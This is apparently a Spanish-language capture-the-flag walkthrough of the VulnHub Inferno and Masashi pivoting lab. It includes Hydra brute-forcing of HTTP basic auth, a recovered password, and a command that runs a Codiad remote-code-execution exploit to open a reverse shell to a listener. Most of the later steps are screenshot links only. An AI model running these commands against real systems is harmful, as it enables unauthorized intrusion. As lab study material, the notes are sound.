Lunes 10 de junio del 2023 Mexico.
CDMX-Polanco
Valente Spiegel

Nota: En esta máquina hemos configurado una red interna para Pivotar a Masashi.

---
### Habilidades. [[Disiplinas.]]

### Inferno & Masashi

Enumeración web.
Fuerza bruta de autenticación web básica - Hydra 
Explotación autenticada de Codiad - Ejecución remota de código 
Fuga de información
Abuso de privilegios de sudo para asignar un nuevo privilegio en sudoers [Elevación de privilegios] 
Abuso de privilegios de sudo (Elevación de privilegios)
Fuerza bruta SSH - Hydra 

EXTRA: Creación de un script bash para descubrir computadoras en la red interna 
EXTRA: Creación de un script bash para descubrir los puertos abiertos de las computadoras
descubiertas en la red interna 
EXTRA: Reenvío remoto de puertos - Jugando con Chisel 
EXTRA: Conexión Socks5 con Chisel (Pivot) 
EXTRA: FoxyProxy + Túnel Socks5 
EXTRA: Fuzzing con gobuster a través de un proxy Socks5 Creación de un diccionario personalizado con cewl 

### Certificaciones.

eWPT  
eCPPTv2

---

### Creación de directorios para espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```
mkdir Infernoandmasashi && cd Infernoandmasashi && mkdir {Scan,Content,Exploits,Evidencia}
```

---
## Preparación del Laboratorio en VMware Interfaces de red.

=="Configuración de Adaptadores de red"

El laboratorio será de tipo pivoting por lo cual solo tendremos visibilidad a la máquina Inferno mientras está misma tendrá una 2da interfaz en el rango 10.10.0.0 y en este segmento de ted también se encuentra la máquina Masashi.

inferno = esn33 - ens35
Masashi = esn35


![[zzzzzz/VulnHub/InfernoyMasashi/1.png]]
![[zzzzzz/VulnHub/InfernoyMasashi/2.png]]

![[Captura de pantalla 2023-07-10 161408.png]]

![[Captura de pantalla 2023-07-10 162134.png]]

![[Captura de pantalla 2023-07-10 162424.png]]

![[Captura de pantalla 2023-07-10 162534.png]]

---
## preparación de el laboratorio en VMware "GRUB"

==El directorio en dónde se establece las interfaces de red está configurado para funcionar en Virtual box y establece nombres de tarjetas ajenas a VMware 

```
~e
rw init=/bin/bash
Ctrl+x
```
![[Captura de pantalla 2023-07-10 162753.png]]

```
cd /usr/network
ls
nano interfaces 
```
![[Captura de pantalla 2023-07-10 162958.png]]

==debemos modificar las interfaces de red de la máquina Inferno sustituyendo por ens33 y agregar ens35

![[Captura de pantalla 2023-07-10 163228.png]]

```
allow hotplug ens33
iface ens33 inet dhcp

allow hotplug ens35
iface ens35 inet dhcp

```

---
## Descubrimiento.

==Necesitamos ubicar la IP que nos interesa.
```
sudo netdiscover
sudo arp-scan -I ens33 --localnet
ping 192.168.153.136
```
![[Captura de pantalla -2023-07-10 16-41-52.png]]

---
## Enumeración.

==Escaneo dedicado a el descubrimiento de puertos y vectores de ataque.

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.136
```

![[Captura de pantalla -2023-07-10 16-49-17.png]]

```
sudo nmap -sCV -p22,80 192.168.153.136 - oN targetd
```

![[Captura de pantalla -2023-07-10 16-50-10.png]]

---
### Escaneo web.

==Para saber a qué tecnologías nos estamos enfrentando obtendremos todo lo disponible en el servicio http:80

```
whatweb 192.168.153.136
```

![[Captura de pantalla -2023-07-10 16-51-12.png]]

http://192.168.153.136

![[Captura de pantalla -2023-07-10 16-52-20.png]]
==Parece ser una página web inspirada en la novela llamada la divina comedia.

```
gobuster dir -u http://192.168.153.136 -w /usr/share/seclist/Discovery/web-content/directory-list-3.2-medium.txt -t 20
```

![[Captura de pantalla -2023-07-10 17-11-29.png]]

==El resultado del ataque fue positivo arrojando que se encuentra un directorio web llamado Inferno.

http://192.168.153.136/inferno

![[Captura de pantalla -2023-07-10 17-12-36.png]]

==Nos pide un user y password

==Para esto utilizamos un ataque de fuerza bruta con hydra y un diccionario de contraseñas de Seclist

```
sudo hydra -l admin -p /usr/share/wordlis/rockyou.txt 192.168.153.136 http-get /inferno -t 60
```

![[Captura de pantalla -2023-07-12 12-00-16.png]]

Admin::dante1

![[Captura de pantalla -2023-07-12 12-00-43.png]]

Admin::dante1

![[Captura de pantalla -2023-07-12 12-00-58.png]]

==Se despliega un servicio de codiad sobre el puerto 80

![[Captura de pantalla -2023-07-12 12-02-17.png]]

---
### Escalamiento a usuario.

==Buscamos alguna vulnerabilidad  de codiat con searchsploit 

``` 
searchsploit codiad
```
![[Captura de pantalla -2023-07-12 12-24-22.png]]

==Nos interesa la remote code execution ya que tenemos credenciales auténticas de acceso  descargamos y modificamos nombré.


```
searchsploit -m múltiple/webapps/49704.py
```

![[Captura de pantalla -2023-07-12 12-25-10.png]]

==El exploit nos pide una serie de parámetros y la ejecución de 2 servicios netcat en escucha.

![[Captura de pantalla -2023-07-12 12-25-30.png]]

```
python3 codiad.py http://admin:dante1@192.168.153.136/inferno/ admin dante1 192.168.153.129 443 Linux


```

![[Captura de pantalla -2023-07-12 12-31-29.png]]

![[Captura de pantalla -2023-07-12 12-47-30.png]]


![[Captura de pantalla -2023-07-12 12-54-06.png]]

![[Captura de pantalla -2023-07-12 13-20-59.png]]

![[Captura de pantalla -2023-07-12 13-24-31.png]]

![[Captura de pantalla -2023-07-12 13-25-35.png]]

![[Captura de pantalla -2023-07-12 13-31-25.png]]

![[Captura de pantalla -2023-07-12 14-15-11.png]]

![[Captura de pantalla -2023-07-12 14-16-15.png]]

![[Captura de pantalla -2023-07-12 14-18-49.png]]

![[Captura de pantalla -2023-07-12 14-29-26.png]]

![[Captura de pantalla -2023-07-12 14-40-37.png]]

![[Captura de pantalla -2023-07-13 13-42-54.png]]

![[Captura de pantalla -2023-07-13 13-44-59.png]]

![[Captura de pantalla -2023-07-13 13-48-50.png]]

![[Captura de pantalla -2023-07-13 13-50-24.png]]

![[Captura de pantalla -2023-07-13 13-59-51.png]]

![[Captura de pantalla -2023-07-13 14-02-19.png]]

![[Captura de pantalla -2023-07-13 14-09-10.png]]

![[Captura de pantalla -2023-07-13 14-11-15.png]]

![[Captura de pantalla -2023-07-13 14-12-34.png]]

![[Captura de pantalla -2023-07-13 14-12-38.png]]

![[Captura de pantalla -2023-07-13 14-12-44.png]]

![[Captura de pantalla -2023-07-13 14-12-50.png]]

![[Captura de pantalla -2023-07-13 14-18-05.png]]

![[Captura de pantalla -2023-07-13 14-25-05.png]]
![[Captura de pantalla -2023-07-13 14-26-06.png]]

![[Captura de pantalla -2023-07-13 14-26-42.png]]

![[Captura de pantalla -2023-07-13 14-27-54.png]]

![[Captura de pantalla -2023-07-13 14-31-12.png]]

![[Captura de pantalla -2023-07-13 14-31-53.png]]

![[Captura de pantalla -2023-07-13 14-32-06.png]]
![[Captura de pantalla -2023-07-13 14-32-21.png]]